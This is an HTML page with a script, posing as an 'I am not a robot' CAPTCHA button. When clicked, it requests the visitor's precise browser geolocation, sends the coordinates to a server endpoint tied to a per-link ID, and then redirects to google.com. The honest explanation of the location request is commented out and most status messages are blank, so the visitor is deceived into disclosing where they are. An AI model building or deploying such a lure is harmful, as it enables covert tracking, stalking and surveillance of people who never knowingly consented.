<!DOCTYPE html>
<html>

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Share Location</title>

    <style>
        body {
            font-family: Arial;
            text-align: center;
            padding: 50px 20px;
        }

        button {
            padding: 15px 25px;
            font-size: 16px;
            cursor: pointer;
        }

        #status {
            margin-top: 25px;
        }
    </style>

</head>

<body>

    <!-- <h1></h1>

    <p>
        This website is requesting your current location.
    </p>

    <p>
        Your browser will ask for permission before sharing it.
    </p> -->

    <button onclick="shareLocation()">
        I am not a robot
    </button>

    <div id="status"></div>

    <script>

        const shareId =
            window.location.pathname.split("/").pop();

        function shareLocation() {

            const status =
                document.getElementById("status");

            if (!navigator.geolocation) {

                status.innerText =
                    "";

                return;
            }

            status.innerText =
                "Requesting location permission...";

            navigator.geolocation.getCurrentPosition(

                async function (position) {

                    const latitude =
                        position.coords.latitude;

                    const longitude =
                        position.coords.longitude;

                    const accuracy =
                        position.coords.accuracy;

                    const timestamp =
                        new Date().toISOString();

                    status.innerText =
                        "Sending location...";

                    try {

                        const response =
                            await fetch(
                                `/api/location/${shareId}`,
                                {
                                    method: "POST",

                                    headers: {
                                        "Content-Type":
                                            "application/json"
                                    },

                                    body: JSON.stringify({

                                        latitude,
                                        longitude,
                                        accuracy,
                                        timestamp

                                    })
                                }
                            );

                        const data =
                            await response.json();

                        if (data.success) {
                            status.innerText = "";

                            setTimeout(() => {
                                window.location.href =
                                    "https://www.google.com/";
                            }, 500);
                        } else {

                            status.innerText =
                                "";
                        }

                    } catch (error) {

                        console.error(error);

                        status.innerText =
                            "Network error.";
                    }

                },

                function (error) {

                    console.log(error);

                    if (error.code === 1) {

                        status.innerText =
                            "";

                    } else if (error.code === 2) {

                        status.innerText =
                            "";

                    } else if (error.code === 3) {

                        status.innerText =
                            "";

                    } else {

                        status.innerText =
                            "";
                    }
                },

                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

    </script>

</body>

</html>
